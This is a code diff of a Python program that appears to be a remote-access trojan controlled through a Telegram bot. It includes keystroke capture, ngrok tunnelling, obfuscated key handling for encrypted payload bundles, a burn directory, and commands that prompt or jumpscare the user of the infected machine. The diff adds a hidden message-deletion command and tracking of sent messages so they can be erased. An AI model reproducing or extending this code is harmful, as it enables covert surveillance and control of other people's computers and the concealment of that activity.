@@ -46,7 +46,6 @@ import ctypes
 import psutil
 import pyngrok
 import inspect
-import builtins
 import functools
 import traceback
 from io import BytesIO
@@ -65,18 +64,20 @@ from os import system, remove, getenv, getcwd, name, getlogin, chmod, rename
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN, KEY_UP
 from os.path import join, abspath, isdir, isfile, dirname, realpath, split as pathsplit, basename, getsize
 
+"""
+MAGIC BYTES
+Bundle         : RCPTB
+Key            : RCPTK
+Encrypted Files: RCPTE
+"""
+
 from utils import *
 try:
     from plugins import *
 except ImportError as e:
     print(f"Plugins not loaded\n{e}\n")
     plugins = None
-
 from utils.vfs_runtime import *
-print(f"\nVFS TREE:")
-for dir in vfs.listdir("."):
-    vfs_tree(dir)
-print()
 
 #TODO Add all the message boxes to a file un user_interaction/boxes.py
 
@@ -165,13 +166,14 @@ def get_real_key(key_path): #this function MUST stay in the main to remain obfus
     return bytes(key_bytes)
 
 DATA_ENCRYPTION = exists(keyfile)
+print(f"KEYFILE EXISTS")
 if DATA_ENCRYPTION:
     FERNET_KEY = get_real_key(KEY_PATH)
     print(f"KEY: {FERNET_KEY}")
     if not FERNET_KEY:
         print("FERNET KEY IS NONE")
         sys.exit(1)
-    FERNET = SimpleFernet(FERNET_KEY, b"RCPTE")
+    FERNET = SimpleFernet(FERNET_KEY, b"RCPTK")
 
 if isdir(DLLS_DIR):
     print(f"DLLS Directory exists: {DLLS_DIR}")
@@ -186,25 +188,6 @@ def get_decrypted_content(fernet: SimpleFernet, src_path) -> bytes:
         encrypted = f.read()
     decrypted = fernet.decrypt(encrypted)
     return decrypted
-
-def decrypt_file(fernet, src_path, dst_path):
-    decrypted = get_decrypted_content(fernet, src_path)
-    with open(dst_path, "wb") as f:
-        f.write(decrypted)
-
-def decrypt_directory(fernet, src_dir, filter: Callable[[str], bool]|None=None):
-    for root, dirs, files in os.walk(src_dir):
-        for file in files:
-            if filter:
-                if not filter(file):
-                    continue
-            enc_path = os.path.join(root, file)
-            plain_path = os.path.join(root, file[:-4])
-            try:
-                decrypt_file(fernet, enc_path, plain_path)
-                os.remove(enc_path)
-            except Exception:
-                pass  # or log/raise depending on your needs
 
 def close_all_tunnels(ngrok):
     tunnels = ngrok.get_tunnels()
@@ -222,14 +205,10 @@ while isfile(BURN_DIRECTORY):
 
 if isfile(prototxt_filename) and isfile(caffemodel_filename):
     try:
-        if DATA_ENCRYPTION and False:#DISABLED FOR NOW
-            prototxt_data = get_decrypted_content(prototxt_filename)
-            caffemodel_data = get_decrypted_content(caffemodel_filename)
-        else:
-            with open(prototxt_filename, 'rb') as f:
-                prototxt_data = f.read()
-            with open(caffemodel_filename, 'rb') as f:
-                caffemodel_data = f.read()
+        with open(prototxt_filename, 'rb') as f:
+            prototxt_data = f.read()
+        with open(caffemodel_filename, 'rb') as f:
+            caffemodel_data = f.read()
         prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
         caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
         net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
@@ -727,6 +706,7 @@ class PeppinoTelegram:
             Command("id", lambda: self.bsend(f"CHAT_ID: {self.owner_id}"), "Send chat ID.", "messaging", "🆔 Id"),
             Command("deletemessages", self.deleteallmessages, "Delete recent messages.", "messaging", "❌ Deletemessages"),
             Command("deleteallmessages", self.deleteallmessages, "Delete all messages.", "messaging", "🗑️ Deleteallmessages"),
+            Command("cls", self.deleteallmessages, "Delete all messages.", "null", "null"),
 
             # 👤 User Interaction
             Command("ask", self.user_prompt, "Ask Something to the user using the machine", "user_interaction", "🗣️ Ask"),
@@ -835,9 +815,11 @@ class PeppinoTelegram:
             assert (image_name is None) ^ (image_buf is None), "You can only use either image_name or image_buf"
             if image_buf:
                 msg = self.bot.sendPhoto(self.owner_id, image_buf, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode)["message_id"]
+                self.all_session_messages.append(msg)
             if image_name:
                 with open(image_name, "rb") as image:
                     msg = self.bot.sendPhoto(self.owner_id, image, caption=caption, reply_markup=reply_markup, parse_mode=parse_mode)["message_id"]
+                    self.all_session_messages.append(msg)
             return msg
         except Exception as e:
             return self.bsend(f"Error while sending an image\n{e}")
@@ -2753,18 +2735,27 @@ The bot is now restarting. Please wait a moment...
 
         lines.append("\n<b>⚙️ Core Settings</b>")
 
-        # === All settings you asked for + everything else I found ===
         current_vol = self.audio_mixer.getVolumePercentage()
         restart_human = "DISABLED" if self.RESTART_TIME_TRESHOLD is None else \
                         f"{self.RESTART_TIME_TRESHOLD}s" if self.RESTART_TIME_TRESHOLD < 120 else \
                         f"{self.RESTART_TIME_TRESHOLD//60} min" if self.RESTART_TIME_TRESHOLD < 3600 else \
                         f"{self.RESTART_TIME_TRESHOLD//3600} h"
+        last_ts = self.getLastMessageTimestamp()
+        threshold = self.RESTART_TIME_TRESHOLD
+
+        if last_ts is None or self.RESTART_TIME_TRESHOLD is None:
+            elapsed = "N/A"
+            remaining = "N/A"
+        else:
+            elapsed = monotonic() - last_ts
+            remaining = threshold - elapsed
 
         lines.extend([
             f"🔊 <b>Jumpscare volume</b>: <code>{self.jumpscare_volume}%</code>",
             f"📢 <b>System volume</b>: <code>{current_vol}%</code>",
             f"🖱️ <b>Mouse jump</b>: <code>{self.MOUSE_JMP} px</code>",
             f"⏰ <b>Auto-restart threshold</b>: <code>{restart_human}</code>",
+            f"🕰️ <b>Time remaining till a restart</b>: <code>{remaining}</code>",
             f"⏳ <b>Message timeout</b>: <code>{self.message_timeout}s</code>",
             f"🎨 <b>Loading bar</b>: <code>{self.loading_bar_set[0]}{self.loading_bar_set[1]}</code> | spinner <code>{self.loading_bar_spinner[0]}</code>",
             f"🌐 <b>Tunnel provider</b>: <code>{self.tunnel_provider}</code> | ngrok ready: <code>{'✅' if self.can_use_ngrok else '❌'}</code>",
